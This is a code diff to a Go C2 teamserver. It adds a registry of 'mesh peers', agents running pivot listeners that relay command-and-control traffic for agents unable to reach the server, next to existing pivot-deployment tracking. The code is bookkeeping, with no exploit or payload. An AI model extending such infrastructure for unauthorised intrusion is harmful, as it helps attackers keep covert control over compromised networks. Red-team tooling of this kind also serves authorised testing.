@@ -38,6 +38,15 @@ type pendingPivot struct {
 	expires  time.Time
 }
 
+// meshPeer represents an agent that is actively running a pivot listener and
+// can relay C2 traffic for other agents that cannot reach the teamserver directly.
+type meshPeer struct {
+	AgentID string
+	Addr    string    // "ip:port" reachable by other agents on the same network
+	Proto   string    // "http" or "tcp"
+	Updated time.Time
+}
+
 type Server struct {
 	cfg     Config
 	db      *DB
@@ -55,6 +64,9 @@ type Server struct {
 
 	pivotMu      sync.Mutex
 	pendingPivots map[string]pendingPivot // targetIP → pending
+
+	meshMu    sync.RWMutex
+	meshPeers map[string]meshPeer // agentID → peer info
 }
 
 // registerPendingPivot records that agentID is about to deploy a child to targetIP.
@@ -88,6 +100,46 @@ func (s *Server) claimPendingPivot(ip string) string {
 		return ""
 	}
 	return p.parentID
+}
+
+// registerMeshPeer records an agent as an active relay peer.
+func (s *Server) registerMeshPeer(agentID, addr, proto string) {
+	s.meshMu.Lock()
+	defer s.meshMu.Unlock()
+	if s.meshPeers == nil {
+		s.meshPeers = make(map[string]meshPeer)
+	}
+	s.meshPeers[agentID] = meshPeer{AgentID: agentID, Addr: addr, Proto: proto, Updated: time.Now()}
+}
+
+// unregisterMeshPeer removes an agent from the mesh peer list.
+func (s *Server) unregisterMeshPeer(agentID string) {
+	s.meshMu.Lock()
+	defer s.meshMu.Unlock()
+	delete(s.meshPeers, agentID)
+}
+
+// getMeshPeers returns up to 8 active peers, excluding the requesting agent itself.
+// Stale peers (no update in 30 min) are pruned on each call.
+func (s *Server) getMeshPeers(excludeAgentID string) []meshPeer {
+	s.meshMu.Lock()
+	defer s.meshMu.Unlock()
+	cutoff := time.Now().Add(-30 * time.Minute)
+	var out []meshPeer
+	for id, p := range s.meshPeers {
+		if p.Updated.Before(cutoff) {
+			delete(s.meshPeers, id)
+			continue
+		}
+		if id == excludeAgentID {
+			continue
+		}
+		out = append(out, p)
+		if len(out) >= 8 {
+			break
+		}
+	}
+	return out
 }
 
 func New(cfg Config) (*Server, error) {
